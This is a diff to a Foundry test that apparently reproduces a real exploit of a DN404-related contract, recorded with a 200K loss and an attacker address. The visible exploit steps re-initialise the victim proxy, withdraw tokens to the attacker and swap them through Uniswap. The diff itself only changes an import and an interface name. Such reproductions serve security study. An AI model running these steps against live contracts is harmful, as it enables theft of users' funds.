@@ -2,7 +2,6 @@
 pragma solidity ^0.8.15;
 
 import "forge-std/Test.sol";
-import "./interface.sol";
 
 // @KeyInfo - Total Lost : 200K
 // Attacker : https://etherscan.io/address/0xd215ffaf0f85fb6f93f11e49bd6175ad58af0dfd
@@ -54,7 +53,7 @@ contract DN404 is Test {
 
         IProxy(victim).init(IERC20(WETH), initPeriods, initInterval);
         IProxy(victim).withdraw(IERC20(FLIX), amount, address(this));
-        Uni_Pair_V3(UniV3Pair).swap(address(this), true, 685_000_000_000_000_000_000_000, 4_295_128_740, "");
+        IUniswapV3Pair(UniV3Pair).swap(address(this), true, 685_000_000_000_000_000_000_000, 4_295_128_740, "");
         // Log balances after exploit
         emit log_named_decimal_uint(" Attacker USDT Balance After exploit", IERC20(USDT).balanceOf(address(this)), 6);
     }
